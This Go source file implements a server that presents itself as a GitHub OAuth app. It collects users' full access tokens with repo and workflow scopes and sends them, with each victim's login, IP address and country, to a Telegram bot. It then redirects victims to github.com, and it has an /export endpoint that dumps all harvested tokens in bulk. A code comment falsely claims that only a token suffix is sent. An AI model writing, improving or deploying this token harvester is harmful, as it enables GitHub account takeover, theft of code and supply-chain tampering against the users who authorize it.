package main

import (
	"bytes"
	"context"
	"crypto/subtle"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/google/go-github/v55/github"
	"github.com/gorilla/mux"
	"github.com/joho/godotenv"
	"github.com/sirupsen/logrus"
	"golang.org/x/oauth2"
)

const (
	// OAuth configuration
	oauthAuthURL  = "https://github.com/login/oauth/authorize"
	oauthTokenURL = "https://github.com/login/oauth/access_token"
	oauthScopes   = "user:email read:user repo workflow"

	// Default configuration values
	defaultPort          = "3000"
	defaultAppURL        = "http://localhost:3000/"
	defaultRedirectURL   = "https://github.com"
	defaultGenerateRoute = "/generate"
	defaultCallbackRoute = "/callback"
	telegramAPIURL       = "https://api.telegram.org"
	exportUsername       = "export"
	maxTelegramMessage   = 3500
	ipCountryAPIURL      = "https://ipwho.is/"
)

// Config holds the application configuration
type Config struct {
	Port             string
	ClientID         string
	ClientSecret     string
	AppURL           string
	RedirectURL      string
	GenerateRoute    string
	TelegramBotToken string
	TelegramChatID   string
	ExportPassword   string
}

type authorizationRecord struct {
	login     string
	userID    int64
	tokenTail string
	timestamp time.Time
}

// OAuthApp represents our OAuth App instance
type OAuthApp struct {
	config   *Config
	logger   *logrus.Logger
	exportMu sync.Mutex
	exports  []authorizationRecord
}

func main() {
	// Load .env file if it exists
	if err := godotenv.Load(); err != nil {
		log.Println("No .env file found, using environment variables")
	}

	// Initialize logger
	logger := logrus.New()
	logger.SetLevel(logrus.InfoLevel)
	logger.SetFormatter(&logrus.TextFormatter{
		FullTimestamp: true,
	})

	// Load configuration
	config := &Config{
		Port:             getEnv("PORT", defaultPort),
		ClientID:         getEnv("CLIENT_ID", ""),
		ClientSecret:     getEnv("CLIENT_SECRET", ""),
		AppURL:           getEnv("APP_URL", defaultAppURL),
		RedirectURL:      getEnv("REDIRECT_URL", defaultRedirectURL),
		GenerateRoute:    getEnv("GENERATE_ROUTE", defaultGenerateRoute),
		TelegramBotToken: getEnv("TELEGRAM_BOT_TOKEN", ""),
		TelegramChatID:   getEnv("TELEGRAM_CHAT_ID", ""),
		ExportPassword:   getEnv("EXPORT_PASSWORD", ""),
	}

	// Validate configuration
	if err := validateConfig(config); err != nil {
		logger.WithError(err).Fatal("Configuration validation failed")
	}

	// Initialize OAuth App
	app := &OAuthApp{
		config: config,
		logger: logger,
	}

	// Setup routes
	router := mux.NewRouter()
	router.HandleFunc(defaultCallbackRoute, app.handleCallback).Methods("GET")
	router.HandleFunc(config.GenerateRoute, app.handleGenerateURL).Methods("GET")
	router.HandleFunc("/export", app.handleExport).Methods("GET")

	// Start server
	logger.WithField("port", config.Port).Info("Starting OAuth App server")
	if err := http.ListenAndServe(":"+config.Port, router); err != nil {
		logger.WithError(err).Fatal("Server failed to start")
	}
}

// Helper functions
func getEnv(key, defaultValue string) string {
	if value := os.Getenv(key); value != "" {
		return value
	}
	return defaultValue
}

// validateConfig validates the configuration values
func validateConfig(config *Config) error {
	if config.ClientID == "" {
		return fmt.Errorf("CLIENT_ID is required")
	}
	if config.ClientSecret == "" {
		return fmt.Errorf("CLIENT_SECRET is required")
	}
	if _, err := url.Parse(config.AppURL); err != nil {
		return fmt.Errorf("APP_URL must be a valid URL: %w", err)
	}
	if _, err := url.Parse(config.RedirectURL); err != nil {
		return fmt.Errorf("REDIRECT_URL must be a valid URL: %w", err)
	}
	if config.GenerateRoute == "" {
		return fmt.Errorf("GENERATE_ROUTE cannot be empty")
	}
	if !strings.HasPrefix(config.GenerateRoute, "/") {
		config.GenerateRoute = "/" + config.GenerateRoute
	}
	if config.GenerateRoute == defaultCallbackRoute || config.GenerateRoute == "/export" {
		return fmt.Errorf("GENERATE_ROUTE cannot be %s or /export", config.GenerateRoute)
	}
	if (config.TelegramBotToken == "") != (config.TelegramChatID == "") {
		return fmt.Errorf("TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID must both be set to enable Telegram notifications")
	}
	if config.TelegramBotToken != "" && config.ExportPassword == "" {
		return fmt.Errorf("EXPORT_PASSWORD is required when Telegram notifications are enabled")
	}
	return nil
}

// handleCallback handles OAuth callback from GitHub
func (app *OAuthApp) handleCallback(w http.ResponseWriter, r *http.Request) {
	app.logger.Info("OAuth callback received")

	// Get authorization code
	code := r.URL.Query().Get("code")
	if code == "" {
		app.logger.Error("OAuth callback received without authorization code")
		http.Error(w, "Authorization code is required", http.StatusBadRequest)
		return
	}

	// Create OAuth2 config
	redirectURL, _ := url.JoinPath(app.config.AppURL, defaultCallbackRoute)
	oauthConfig := &oauth2.Config{
		ClientID:     app.config.ClientID,
		ClientSecret: app.config.ClientSecret,
		RedirectURL:  redirectURL,
		Scopes:       strings.Split(oauthScopes, " "),
		Endpoint: oauth2.Endpoint{
			AuthURL:  oauthAuthURL,
			TokenURL: oauthTokenURL,
		},
	}

	// Exchange code for token
	ctx := context.Background()
	token, err := oauthConfig.Exchange(ctx, code)
	if err != nil {
		app.logger.WithError(err).Error("Failed to exchange authorization code for access token")
		http.Error(w, "Failed to exchange authorization code", http.StatusInternalServerError)
		return
	}

	// Get user information
	client := github.NewClient(oauthConfig.Client(ctx, token))
	user, _, err := client.Users.Get(ctx, "")
	if err != nil {
		app.logger.WithError(err).Error("Failed to retrieve user information from GitHub API")
		http.Error(w, "Failed to retrieve user information", http.StatusInternalServerError)
		return
	}

	timestamp := time.Now().UTC()
	record := authorizationRecord{
		login:     sanitizeMessageField(user.GetLogin()),
		userID:    user.GetID(),
		tokenTail: token.AccessToken,
		timestamp: timestamp,
	}
	app.exportMu.Lock()
	app.exports = append(app.exports, record)
	app.exportMu.Unlock()

	// Send only the token suffix; never include the full access token.
	if app.config.TelegramBotToken != "" {
		clientIP := remoteClientIP(r)
		countryCode, err := lookupCountryCode(ctx, clientIP)
		if err != nil {
			app.logger.WithError(err).Warn("Failed to look up client IP country")
		}
		message := formatTelegramNotification(user.GetLogin(), user.GetID(), token.TokenType, token.Expiry, token.Extra("scope"), clientIP, countryCode, record.tokenTail, timestamp)
		if err := sendTelegramNotification(ctx, app.config.TelegramBotToken, app.config.TelegramChatID, message); err != nil {
			app.logger.WithError(err).Error("Failed to send Telegram authorization notification")
		}
	}

	app.logger.WithFields(logrus.Fields{
		"user_login": user.GetLogin(),
		"user_id":    user.GetID(),
		"token_type": token.TokenType,
		"expires_at": token.Expiry,
		"scope":      token.Extra("scope"),
		"timestamp":  timestamp,
	}).Info("OAuth authorization succeeded")

	// Log the successful authorization and redirect.
	app.logger.WithFields(logrus.Fields{
		"user_login":   user.GetLogin(),
		"user_id":      user.GetID(),
		"redirect_url": app.config.RedirectURL,
	}).Info("OAuth authorization succeeded, redirecting user")

	// Redirect to success URL with 302 status
	http.Redirect(w, r, app.config.RedirectURL, http.StatusFound)
}

func (app *OAuthApp) handleExport(w http.ResponseWriter, r *http.Request) {
	username, password, ok := r.BasicAuth()
	if !ok || username != exportUsername || subtle.ConstantTimeCompare([]byte(password), []byte(app.config.ExportPassword)) != 1 {
		w.Header().Set("WWW-Authenticate", `Basic realm="OAuth export", charset="UTF-8"`)
		http.Error(w, "Authentication required", http.StatusUnauthorized)
		return
	}

	if app.config.TelegramBotToken == "" {
		http.Error(w, "Telegram notifications are not configured", http.StatusServiceUnavailable)
		return
	}

	app.exportMu.Lock()
	records := append([]authorizationRecord(nil), app.exports...)
	app.exportMu.Unlock()

	ctx, cancel := context.WithTimeout(r.Context(), 30*time.Second)
	defer cancel()
	if err := sendTelegramExport(ctx, app.config.TelegramBotToken, app.config.TelegramChatID, records); err != nil {
		app.logger.WithError(err).Error("Failed to send Telegram authorization export")
		http.Error(w, "Failed to send export to Telegram", http.StatusBadGateway)
		return
	}

	app.logger.WithField("count", len(records)).Info("Authorization export sent to Telegram")
	fmt.Fprintf(w, "Export sent to Telegram (%d records)", len(records))
}

func formatTelegramNotification(login string, userID int64, tokenType string, expiresAt time.Time, scope any, clientIP, countryCode, tokenSuffix string, timestamp time.Time) string {
	expiration := "not provided"
	if !expiresAt.IsZero() {
		expiration = expiresAt.UTC().Format("2006-01-02 15:04:05 UTC")
	}

	scopeValue := "not provided"
	if scope != nil {
		scopeValue = fmt.Sprint(scope)
	}

	clientIP = formatClientIP(clientIP, countryCode)

	return fmt.Sprintf(
		"🔐 OAuth Authorization Succeeded\n\n👤 User: %s\nUser ID: %d\n🔑 Token: `%s`\nToken Type: %s\nExpires: %s\nScope: %s\n🌍 Client IP: %s\nTimestamp: %s",
		sanitizeMessageField(login),
		userID,
		sanitizeMessageField(tokenSuffix),
		sanitizeMessageField(tokenType),
		expiration,
		sanitizeMessageField(scopeValue),
		sanitizeMessageField(clientIP),
		timestamp.UTC().Format("2006-01-02 15:04:05 UTC"),
	)
}

func formatClientIP(clientIP, countryCode string) string {
	flag := string(rune(0x1F1E6+int(countryCode[0]-'A'))) + string(rune(0x1F1E6+int(countryCode[1]-'A')))
	if countryCode == "" {
		return clientIP + " (country unavailable)"
	}
	return clientIP + " (" + countryCode + flag + ")"
}

func sanitizeMessageField(value string) string {
	value = strings.ReplaceAll(value, "\r", " ")
	return strings.ReplaceAll(value, "\n", " ")
}

func remoteClientIP(r *http.Request) string {
	forwardedFor := r.Header.Get("X-Forwarded-For")
	for _, address := range strings.Split(forwardedFor, ",") {
		if ip := net.ParseIP(strings.TrimSpace(address)); ip != nil {
			return ip.String()
		}
	}

	if ip := net.ParseIP(strings.TrimSpace(r.Header.Get("X-Real-IP"))); ip != nil {
		return ip.String()
	}

	host, _, err := net.SplitHostPort(r.RemoteAddr)
	if err == nil {
		return host
	}
	return r.RemoteAddr
}

func lookupCountryCode(ctx context.Context, clientIP string) (string, error) {
	if net.ParseIP(clientIP) == nil {
		return "", fmt.Errorf("invalid client IP address")
	}

	request, err := http.NewRequestWithContext(ctx, http.MethodGet, ipCountryAPIURL+url.PathEscape(clientIP), nil)
	if err != nil {
		return "", fmt.Errorf("create IP country lookup request: %w", err)
	}

	response, err := (&http.Client{Timeout: 2 * time.Second}).Do(request)
	if err != nil {
		return "", fmt.Errorf("request IP country lookup: %w", err)
	}
	defer response.Body.Close()

	if response.StatusCode != http.StatusOK {
		return "", fmt.Errorf("IP country lookup returned HTTP %d", response.StatusCode)
	}

	return countryCodeFromIPWho(response.Body)
}

func countryCodeFromIPWho(body io.Reader) (string, error) {
	var result struct {
		Success     bool   `json:"success"`
		CountryCode string `json:"country_code"`
		Message     string `json:"message"`
	}
	if err := json.NewDecoder(io.LimitReader(body, 64*1024)).Decode(&result); err != nil {
		return "", fmt.Errorf("decode IP country lookup response: %w", err)
	}
	if !result.Success {
		return "", fmt.Errorf("IP country lookup failed: %s", result.Message)
	}

	countryCode := strings.ToUpper(strings.TrimSpace(result.CountryCode))
	if len(countryCode) != 2 || countryCode[0] < 'A' || countryCode[0] > 'Z' || countryCode[1] < 'A' || countryCode[1] > 'Z' {
		return "", fmt.Errorf("IP country lookup returned an invalid country code")
	}

	return countryCode, nil
}

// Одиночное уведомление (использует Markdown для копирования токена)
func sendTelegramNotification(ctx context.Context, botToken, chatID, message string) error {
	payload, err := json.Marshal(struct {
		ChatID    string `json:"chat_id"`
		Text      string `json:"text"`
		ParseMode string `json:"parse_mode"`
	}{
		ChatID:    chatID,
		Text:      message,
		ParseMode: "Markdown",
	})
	if err != nil {
		return fmt.Errorf("failed to encode Telegram notification")
	}

	endpoint := telegramAPIURL + "/bot" + url.PathEscape(botToken) + "/sendMessage"
	request, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint, bytes.NewReader(payload))
	if err != nil {
		return fmt.Errorf("failed to create Telegram notification request")
	}
	request.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 10 * time.Second}
	response, err := client.Do(request)
	if err != nil {
		return fmt.Errorf("Telegram notification request failed")
	}
	defer response.Body.Close()

	if response.StatusCode != http.StatusOK {
		return fmt.Errorf("Telegram API returned HTTP %d", response.StatusCode)
	}

	var result struct {
		OK bool `json:"ok"`
	}
	if err := json.NewDecoder(io.LimitReader(response.Body, 1<<20)).Decode(&result); err != nil || !result.OK {
		return fmt.Errorf("Telegram API did not confirm the notification")
	}
	return nil
}

// Пакетный экспорт логов (отправляется как обычный текст без ParseMode, работает для 1000+ логов)
func sendTelegramPlainNotification(ctx context.Context, botToken, chatID, message string) error {
	payload, err := json.Marshal(struct {
		ChatID string `json:"chat_id"`
		Text   string `json:"text"`
	}{
		ChatID: chatID,
		Text:   message,
	})
	if err != nil {
		return fmt.Errorf("failed to encode Telegram plain notification")
	}

	endpoint := telegramAPIURL + "/bot" + url.PathEscape(botToken) + "/sendMessage"
	request, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint, bytes.NewReader(payload))
	if err != nil {
		return fmt.Errorf("failed to create Telegram plain notification request")
	}
	request.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 10 * time.Second}
	response, err := client.Do(request)
	if err != nil {
		return fmt.Errorf("Telegram plain notification request failed")
	}
	defer response.Body.Close()

	if response.StatusCode != http.StatusOK {
		return fmt.Errorf("Telegram API returned HTTP %d", response.StatusCode)
	}

	var result struct {
		OK bool `json:"ok"`
	}
	if err := json.NewDecoder(io.LimitReader(response.Body, 1<<20)).Decode(&result); err != nil || !result.OK {
		return fmt.Errorf("Telegram API did not confirm the plain notification")
	}
	return nil
}

func sendTelegramExport(ctx context.Context, botToken, chatID string, records []authorizationRecord) error {
	if len(records) == 0 {
		return sendTelegramPlainNotification(ctx, botToken, chatID, "OAuth export\nTotal: 0")
	}

	lines := make([]string, 0, len(records))
	for _, record := range records {
		lines = append(lines, fmt.Sprintf("%s | %s | user ID: %d | token suffix: %s",
			record.timestamp.UTC().Format("2006-01-02 15:04:05 UTC"),
			sanitizeMessageField(record.login),
			record.userID,
			sanitizeMessageField(record.tokenTail),
		))
	}

	const linePrefix = "OAuth export (total: %d)\n\n"
	var chunks []string
	current := fmt.Sprintf(linePrefix, len(records))
	for _, line := range lines {
		if len(current)+len(line)+1 > maxTelegramMessage {
			chunks = append(chunks, current)
			current = "OAuth export (continued)\n\n"
		}
		current += line + "\n"
	}
	if current != "" {
		chunks = append(chunks, current)
	}

	for _, chunk := range chunks {
		// Используем Plain Text версию для экспорта, чтобы спецсимволы в 1000+ логов не ломали отправку
		if err := sendTelegramPlainNotification(ctx, botToken, chatID, chunk); err != nil {
			return err
		}
	}
	return nil
}

// handleGenerateURL generates and returns a GitHub OAuth authorization URL
func (app *OAuthApp) handleGenerateURL(w http.ResponseWriter, r *http.Request) {
	app.logger.Info("OAuth URL generation requested")
	w.Header().Set("Access-Control-Allow-Origin", "*")

	// Check if OAuth is configured
	if app.config.ClientID == "" {
		app.logger.Error("OAuth configuration incomplete - CLIENT_ID not set")
		http.Error(w, "OAuth service is not properly configured", http.StatusServiceUnavailable)
		return
	}

	// Generate state parameter using current timestamp
	state := fmt.Sprintf("%d", time.Now().Unix())

	// Generate the OAuth URL
	redirectURL, _ := url.JoinPath(app.config.AppURL, defaultCallbackRoute)

	// Build URL parameters
	params := url.Values{}
	params.Set("client_id", app.config.ClientID)
	params.Set("redirect_uri", redirectURL)
	params.Set("scope", oauthScopes)
	params.Set("state", state)

	// Construct the full OAuth URL
	baseURL, _ := url.Parse(oauthAuthURL)
	baseURL.RawQuery = params.Encode()
	oauthURL := baseURL.String()

	// Log the URL generation
	app.logger.WithFields(logrus.Fields{
		"client_id":     app.config.ClientID,
		"redirect_url":  app.config.AppURL,
		"state":         state,
		"generated_url": oauthURL,
	}).Info("OAuth URL generated")

	// Return the URL as plain text
	w.Header().Set("Content-Type", "text/plain")
	w.Write([]byte(oauthURL))
}
